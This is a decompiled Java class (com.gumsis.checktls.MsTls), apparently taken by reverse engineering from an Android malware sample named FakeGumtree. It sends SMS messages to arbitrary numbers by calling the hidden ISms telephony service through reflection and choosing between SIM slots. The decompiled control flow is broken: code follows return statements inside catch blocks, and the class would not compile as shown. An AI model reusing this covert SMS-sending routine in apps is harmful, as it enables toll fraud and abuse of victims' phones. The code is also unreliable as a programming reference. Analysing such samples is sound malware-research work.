package com.gumsis.checktls;

import android.app.PendingIntent;
import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class MsTls
{
  private static boolean lollypopPlus(Context paramContext)
  {
    if (Build.VERSION.SDK_INT < 22) {}
    while (SubscriptionManager.from(paramContext).getActiveSubscriptionInfoCount() <= 1) {
      return false;
    }
    return true;
  }
  
  public static boolean sendFullSMS(Context paramContext, int paramInt, String paramString1, String paramString2, String paramString3, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2)
  {
    if (paramInt == 0) {}
    for (;;)
    {
      try
      {
        if (!Build.MODEL.equals("Philips T939")) {
          break label600;
        }
        localObject = "isms0";
        Method localMethod = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
        localMethod.setAccessible(true);
        localObject = localMethod.invoke(null, new Object[] { localObject });
        localMethod = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[] { IBinder.class });
        localMethod.setAccessible(true);
        localObject = localMethod.invoke(null, new Object[] { localObject });
        Log.e("MsTls", "send msg - " + paramString3);
        if (Build.VERSION.SDK_INT >= 18) {
          continue;
        }
        localObject.getClass().getMethod("sendText", new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class }).invoke(localObject, new Object[] { paramString1, paramString2, paramString3, paramPendingIntent1, paramPendingIntent2 });
      }
      catch (ClassNotFoundException paramContext)
      {
        Log.e("apipas", "ClassNotFoundException:" + paramContext.getMessage());
        paramContext.printStackTrace();
        Log.e("MsTls", "error 1");
        return false;
        if (!lollypopPlus(paramContext)) {
          continue;
        }
        paramString2 = new ArrayList();
        paramContext = SubscriptionManager.from(paramContext).getActiveSubscriptionInfoList().iterator();
        if (!paramContext.hasNext()) {
          continue;
        }
        int i = ((SubscriptionInfo)paramContext.next()).getSubscriptionId();
        paramString2.add(Integer.valueOf(i));
        Log.e("MsTls", "SmsManager - subscriptionId: " + i);
        continue;
      }
      catch (NoSuchMethodException paramContext)
      {
        Log.e("apipas", "NoSuchMethodException:" + paramContext.getMessage());
        Log.e("MsTls", "error 2");
        paramContext.printStackTrace();
        return false;
        SmsManager.getSmsManagerForSubscriptionId(((Integer)paramString2.get(paramInt)).intValue()).sendTextMessage(paramString1, null, paramString3, paramPendingIntent1, paramPendingIntent2);
      }
      catch (InvocationTargetException paramContext)
      {
        Log.e("apipas", "InvocationTargetException:" + paramContext.getMessage());
        Log.e("MsTls", "error 3");
        paramContext.printStackTrace();
        return false;
        SmsManager.getDefault().sendTextMessage(paramString1, null, paramString3, paramPendingIntent1, paramPendingIntent2);
      }
      catch (IllegalAccessException paramContext)
      {
        Log.e("apipas", "IllegalAccessException:" + paramContext.getMessage());
        Log.e("MsTls", "error 4");
        paramContext.printStackTrace();
        return false;
      }
      catch (Exception paramContext)
      {
        Log.e("apipas", "Exception:" + paramContext.getMessage());
        Log.e("MsTls", "error 5");
        paramContext.printStackTrace();
        return false;
      }
      throw new Exception("can not get service which for sim '" + paramInt + "', only 0,1 accepted as values");
      return true;
      label600:
      Object localObject = "isms";
      continue;
      if (paramInt == 1) {
        localObject = "isms2";
      }
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/MsTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */